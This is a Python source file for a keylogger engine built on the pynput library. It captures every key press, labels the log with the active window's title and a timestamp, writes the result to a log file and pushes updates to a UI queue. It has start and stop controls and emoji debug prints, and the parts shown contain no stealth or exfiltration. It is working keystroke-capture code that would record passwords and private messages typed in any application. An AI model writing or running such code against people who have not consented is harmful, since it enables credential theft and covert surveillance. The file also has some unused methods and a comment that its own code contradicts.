
from pynput import keyboard
import datetime
import time
import threading


class KeyloggerEngine:
    """Handles the actual keylogging logic"""

    def __init__(self, file_manager, get_active_window_func, log_update_queue=None):
        self.file_manager = file_manager
        self.get_active_window = get_active_window_func
        self.log_update_queue = log_update_queue
        self.listener = None
        self.is_running = False
        self.current_log_file = None
        self.last_window = ""
        self._lock = threading.Lock()
        self._listener_thread = None

    def _on_press(self, key):
        """Callback for key press events"""
        if not self.is_running:
            return False # Stop listener if not running

        try:
            # Get current time and active window
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            # Don't call get_active_window() every keypress it's expensive!
            # Only call it periodically or when windo actually changes

            try:
                active_window = self.get_active_window()
            except:
                active_window = "Unknown"

            # Check if window changed
            if active_window != self.last_window:
                self.last_window = active_window
                log_entry = f"\n\n[--- {active_window} --- {timestamp} ---]\n"
            else:
                log_entry = ""

            # Format key
            if hasattr(key, 'char') and key.char:
                log_entry += key.char
            else:
                # Special keys
                key_name = str(key).replace("Key.", "")
                log_entry += f"<{key_name}>"

            # Write to file
            self.file_manager.write_log(self.current_log_file, log_entry)

            # Notify the UI thread that an update happened
            if self.log_update_queue:
                try:
                    # Put the file path in the queue for the UI to process
                    self.log_update_queue.put_nowait(self.current_log_file)
                except:
                    pass # Queue full, skip notification

        except Exception as e:
            print(f"Error in keylogger: {e}")

    def start(self):
        """Start the keylogger"""
        print("4️⃣ Keylogger start() called")

        with self._lock:
            if self.is_running:
                print("5️⃣ Already running, exiting")
                return
            print("6️⃣ Setting is_running = True")
            self.is_running = True

        self.current_log_file = self.file_manager.get_log_filename()
        self.last_window = ""

        # Initial log entry
        print("7️⃣ Writing initial log entry")
        initial_entry = f"\n[--- Logging Started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---]\n"
        self.file_manager.write_log(self.current_log_file, initial_entry)

        # ✅ Create and start listener (it manages its own thread internally)
        print("8️⃣ Creating keyboard listener")
        self.listener = keyboard.Listener(on_press=self._on_press)

        print("9️⃣ Starting keyboard listener")
        # Use start() - pynput manages threading internally
        self.listener.start()

        # ✅ DON'T call .join() - let it run in background
        print("🔟 Listener started (non-blocking)")

    def _run_listener(self):
        """Run the keyboard listener (runs in separate thread)"""
        try:
            print("🎹 Listener thread running...")
            # This BLOCKS until stop() is called
            self.listener.run()
            print("🎹 Listener thread finished")
        except Exception as e:
            print(f"❌ Listener thread error: {e}")
            import traceback
            traceback.print_exc()


    def stop(self):
        """Stop the keylogger"""
        print("🛑 Stop requested")
        if not self.is_running:
            print("🛑 Not running, nothing to stop")
            return

        with self._lock:
            self.is_running = False

        # Stop the listener
        if self.listener:
            print("🛑 Stopping listener...")
            self.listener.stop()
            self.listener = None

        # Wait for thread to finish (with timeout)
        if self._listener_thread and self._listener_thread.is_alive():
            print("🛑 Waiting for listener thread to finish...")
            self._listener_thread.join(timeout=2.0)

        # Final log entry
        if self.current_log_file:
            final_entry = f"\n[--- Logging Stopped: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---]\n"
            self.file_manager.write_log(self.current_log_file, final_entry)

        self.current_log_file = None
        print("🛑 Stop complete")

















